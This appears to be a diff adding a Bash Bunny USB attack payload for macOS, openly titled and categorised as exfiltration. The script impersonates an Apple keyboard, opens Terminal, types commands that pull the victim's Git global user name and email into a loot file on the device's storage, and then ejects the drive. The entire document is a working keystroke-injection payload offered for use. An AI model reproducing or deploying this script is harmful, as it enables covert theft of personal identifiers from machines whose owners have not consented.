@@ -1,0 +1,58 @@
+#!/bin/bash
+#
+# Title:         OSX Payload to exfiltrate Git user name and email
+# Description:   Get Git user name and email from the Git global config and exfiltrate them
+# Author:        quentin_lamamy <contact@quentin-lamamy.fr>
+# Version:       1.0
+# Category:      Exfiltration
+# Attackmodes:   HID STORAGE
+# Target OS:     OSX
+# Dependency:    OSX Extensions
+#
+# Magenta solid           Setup
+# Yellow single blink     Attack in progress
+# Yellow double blink     Sync
+# Yellow triple blink     Cleanup
+# Green blink then solid  Finished
+
+LED SETUP
+
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X0250
+
+OSX TERMINAL OPEN
+
+Q STRING 'last_mounted_volume=$(ls -t /Volumes | head -n 1)'
+Q ENTER
+Q STRING 'lootPath=/Volumes/$last_mounted_volume/loot/gitInfos.txt'
+Q ENTER
+Q STRING 'touch $lootPath'
+Q ENTER
+
+LED ATTACK
+
+# Get the user name from the Git global config
+Q STRING 'user_name=$(git config --global user.name)'
+Q ENTER
+
+# Get the user email from the Git global config
+Q STRING 'user_email=$(git config --global user.email)'
+Q ENTER
+
+Q STRING 'echo -e "Username: $user_name\nMail: $user_email" > $lootPath'
+Q ENTER
+
+# Sync
+LED STAGE 2
+sync
+
+# Cleanup
+LED STAGE 3
+
+# Eject
+QUACK STRING 'diskutil eject $last_mounted_volume'
+QUACK ENTER
+DELAY 100
+
+OSX TERMINAL CLOSE
+
+LED FINISH
